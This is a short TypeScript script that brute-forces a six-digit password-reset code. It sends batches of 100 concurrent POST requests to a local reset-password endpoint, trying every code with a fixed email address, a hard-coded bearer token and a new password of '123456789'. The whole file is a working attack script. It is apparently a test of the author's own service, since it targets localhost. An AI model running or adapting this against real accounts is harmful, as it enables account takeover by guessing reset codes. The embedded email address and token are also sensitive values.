import axios from 'axios'

async function Send_Request(otp: string) {
    let data = JSON.stringify({
        "email": "thewiper777@gmail.com",
        "otp": otp,
        "newpassword": "123456789"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3050/reset-password',
        headers: {
            'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NWQ2NjRjZDI5M2JiN2Y4ZGUwZWJkYTUiLCJpYXQiOjE3MDg1NDkzMjZ9.fqythWqe4sBbLc8l10zwbz1SzCnqdtQpLNe7CEGZfgc',
            'Content-Type': 'application/json'
        },
        data: data
    };
    try{
        await axios.request(config)
    }
   catch(e){

   }
}
async function main() {
    for (let i = 0; i <= 999999; i+=100) {
        const p = []
        for (let j = 0; j < 100; j++) {
            console.log(i+j)
            p.push(Send_Request((i+j).toString()))
        }
        await Promise.all(p)
    }
}


main()